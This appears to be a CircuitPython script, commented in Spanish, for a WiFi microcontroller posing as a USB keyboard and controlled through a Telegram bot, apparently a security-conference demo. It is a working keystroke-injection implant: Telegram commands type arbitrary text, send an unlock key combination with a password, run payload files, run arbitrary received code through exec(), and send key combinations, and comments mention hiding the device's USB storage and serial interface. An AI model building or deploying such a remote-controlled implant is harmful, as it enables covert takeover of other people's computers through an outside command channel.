#Informacion de la placa , chip y version Python
import os ,sys  #help(os.uname())
print(os.uname().machine, os.uname().version) 
print(sys.platform, sys.version, sys.implementation) 



# Conexion WIFI (si has configurado settings.toml no hace falta)
# Pero para ahorrar memoria lo hago "a mano" asi no se carga el WEBRPL
import wifi
if not  wifi.radio.connected:
    print("Conectando wifi",wifi.radio.connect(os.getenv("SSID"),os.getenv("WPWD")))
else:
    print("Wifi ok", wifi.radio.ipv4_address)





#Espero unos segundos para que conecte el wifi
if not wifi.radio.connected: time.sleep(5)
if not wifi.radio.connected: time.sleep(5)
if not wifi.radio.connected: time.sleep(5)







#Estado wifi
import wifi
if wifi.radio.connected:
    print("HOST:\t", wifi.radio.hostname)
    print("IP:\t", wifi.radio.ipv4_address)
    print("GW:\t", wifi.radio.ipv4_gateway,wifi.radio.ping(wifi.radio.ipv4_gateway))
    print("DNS:\t", wifi.radio.ipv4_dns)
else:
    print("sin Conexion")
    #aqui podrie reiniciar a safemode para depuracion






#Pruebas request get y json (obtengo ip publica)
import socketpool, ssl, adafruit_requests, json
if 'pool' not in locals():      #si pool      no existe lo creo
    pool = socketpool.SocketPool(wifi.radio)
if 'urequests' not in locals(): #si urequests no existe lo creo
    urequests = adafruit_requests.Session(pool, ssl.create_default_context())

resp = urequests.get("http://httpbin.org/get")  #help(resp)
#print("\ndepuracion:",resp.status_code,"\n\n",resp.headers,"\n\n",resp.text)#depuracion

mi_json = json.loads((resp.text))#paso respuesta a json
print("Ip Publica:",mi_json['origin'])









# teclado: simula un teclado. Envia pulsaciones que se le pasan como parametro
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode  import Keycode   #help(Keycode)
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
#https://circuitpython.org/libraries

kbd = Keyboard(usb_hid.devices) #help(kbd)
layout = KeyboardLayoutUS(kbd) #help(layout)

def teclado(*args):
    try:
        if len(args) > 2 :    # Combinacion tres teclas a la vez
            kbd.send(args[0], args[1], args[2]);
        elif len(args) == 2 : # Combinacion dos teclas a la vez
            kbd.send(args[0], args[1])
        elif isinstance(args[0], int):
            kbd.send(args[0]) # Una tecla especial. (ej ENTER)
        elif isinstance(args[0], str):
            layout.write(args[0])
    except Exception as err:
        print('Error',err)











# Bot Telegram recibe el ultimo mensaje de un canal (solo una vez/last_update_id)
import socketpool, ssl, adafruit_requests, json
if 'pool' not in locals():      #si pool      no existe lo creo
    pool = socketpool.SocketPool(wifi.radio)
if 'urequests' not in locals(): #si urequests no existe lo creo
    urequests = adafruit_requests.Session(pool, ssl.create_default_context())
# A diferencia de micropyton en circuitpython tengo un numero limitado de sockets/pool
if 'last_update_id' not in locals() or last_update_id is None:
    last_update_id = 0 #Inicializo la variable asi

tk =os.getenv("bot_tk")# #bot+token del bot (ver BotFather)
url="https://api.telegram.org/"+tk+"/getUpdates?offset=-1"

def telegram_bot_recibir_msg():#version solo usuario (no canales)
  global urequests,mi_json,msg,tk,update_id,last_update_id,cid
  try: #bot EuskalHack-EE29
      req = urequests.get(url) #help(req)
      mi_json = req.json()#json.loads((req.text))
      #print(mi_json)#depuracion
      req.close()

      if mi_json['result'] and mi_json['result'][0]['message']:
          update_id = mi_json['result'][0]['update_id']           #num id del mensaje
          msg = mi_json['result'][0]['message']['text']           #texto mensaje
          cid = str(mi_json['result'][0]['message']['chat']['id'])#chat id mensaje
          #print("\ntelegram_bot:",msg,"\n")#depuracion

          #solo retorno una vez cada mensaje.(asi no repito mensajes ya procesados)
          if  last_update_id != update_id:
              last_update_id = update_id
              return msg

      else:
          print("telegram_bot: Sin mensaje")

  except Exception as err:
      print('Error',err)














# Bot Telegram envia un texto via telegram apibot por GET request
# Nota: si enviamos primero un mensaje al bot este almacenara nuestro chat_id/cid
def telegram_bot_send_txt(txt):#idea pasar cid como parametro si no inicializarlo
    global urequests,mi_json,msg,tk,update_id,last_update_id,cid
    if 'cid' not in locals(): cid="-1001535567580" #numero de chat/canal/usuario por defecto
    try:
        print("Envio telegram:",txt," ",end='')
        txt=txt.replace(' ','+') #reemplazo espacios por + (un urlencode "sencillo)
        url="https://api.telegram.org/"+tk+"/sendMessage?chat_id="+str(cid)+"&text="+txt
        r = urequests.get(url)
        print(r.content.decode()[1:10])  #depuracion muestro respuesta de la api
        r.close()
    except Exception as err:
        print('Error',err)








# Depuracion/pruebas: Envio nombre por telegram al iniciar la placa (añado mac para diferenciar placas)
if wifi.radio.connected:
    telegram_bot_send_txt(wifi.radio.hostname+str(wifi.radio.mac_address[-1])+" "+str(wifi.radio.ipv4_address))









# Procesa/ejecuta los comandos recibidos por el bot de telegram
import supervisor
import microcontroller
def procesa_telegram():
    try:
        msg=telegram_bot_recibir_msg()
        print("\nprocesa_telegram:",msg) #,end='')#depuracion

        if not msg: return

        if msg[:4] == '/txt': #envia un texto
            print(" txt:",msg[4:]) #ej /txt notepad
            teclado(msg[4:])

        elif msg[:4] == '/unl': #desbloquea
            print(" unlock")
            teclado(Keycode.CONTROL, Keycode.LEFT_ALT, Keycode.A)
            teclado(msg[4:])
            teclado(Keycode.RETURN)

        elif msg[:4] == '/pld': #ejecuta un payload en un archivo .py
            print(" payload:",msg[4:]) #ej /pld payload1.py
            with open(msg[4:],'r') as file: 
                exec(file.read())

        elif msg[:4] == '/rst': #Resetea dispositivo (ultimo digito mac)
            if int(msg[4:]) == wifi.radio.mac_address[-1]:
                telegram_bot_send_txt("Reset"+msg[4:]);time.sleep(15)
                import microcontroller
                microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)
                microcontroller.reset()

        elif msg[:4] == '/exe':
            exec(msg[5:])

        elif msg[:4] == '/key': #Combinacion tecla/s
            print(" key:",msg[4:]) #ej /pld payload1.py
            keys = msg[4:].split()

            if len(keys) == 1 : # tecla especial (ej ENTER WINDOWS CONTROL SHIFT ALT POWER )
                teclado(getattr(Keycode,keys[0])) #help(Keycode)
            elif len(keys) == 2 : # Combinacion 2 teclas a la vez
                teclado(getattr(Keycode,keys[0]), getattr(Keycode,keys[1]))
            elif len(keys) >  2 : # Combinacion tres teclas a la vez
                teclado(getattr(Keycode,keys[0]), getattr(Keycode,keys[1]), getattr(Keycode,keys[2]))

        else:
            msg =" Error: comando no existe: /txt /unl /pld /key /rst /exe "
            print(msg)

        #confirmo comando procesado: enviando un telegram con la respuesta
        eUSB = str(supervisor.runtime.usb_connected)
        telegram_bot_send_txt(wifi.radio.hostname+str(wifi.radio.mac_address[-1])+" "+msg+eUSB)

    except Exception as err:
        print('Error',err)






# Depuracion / pruebas procesa_telegram()
last_update_id = 0 #para volver a procesar el ultimo mensaje aunque ya se haya procesado
procesa_telegram()











# Si no esta conectado el wifi reinicia en modo seguro Asi puedo reprogamar
import microcontroller,wifi
if not wifi.radio.connected:
    microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)
    microcontroller.reset()
#esto es para poder programarlo si quito el terminal serie en boot.py












# bucle infinito para que el bot telegram se procese indefinidamente (lo limito a 90seg)
# depuracion: cambio bucle infinito por bucle 390Seg
import time
import supervisor #help(supervisor.runtime)
import microcontroller
tiempo_inicial = time.time()
while True and  (time.time() - tiempo_inicial) < 190:
    procesa_telegram()
    print("USB",  supervisor.runtime.usb_connected,)
    print("CDC",  supervisor.runtime.serial_connected,"nb",supervisor.runtime.serial_bytes_available )
    print("sec:", supervisor.ticks_ms()/1024, "Temp:", microcontroller.cpu.temperature)
    print("reset",microcontroller.cpu.reset_reason,"run", supervisor.runtime.run_reason )
    time.sleep(5)  #Deberia diferenciar reser POWER_ON de reset SOFTWARE





# depuracion: al final del bucle reinicia la maq en safe mode  para volver a probar codigo
# esto solo es necesario si has desabilitado USB_storage y USB_CDC (Parte Steal)

#import microcontroller
#microcontroller.on_next_reset(microcontroller.RunMode.SAFE_MODE)
#microcontroller.reset()

# para volver a ejecutar programa:
# screen /dev/ttyACM0
# import microcontroller; microcontroller.reset()

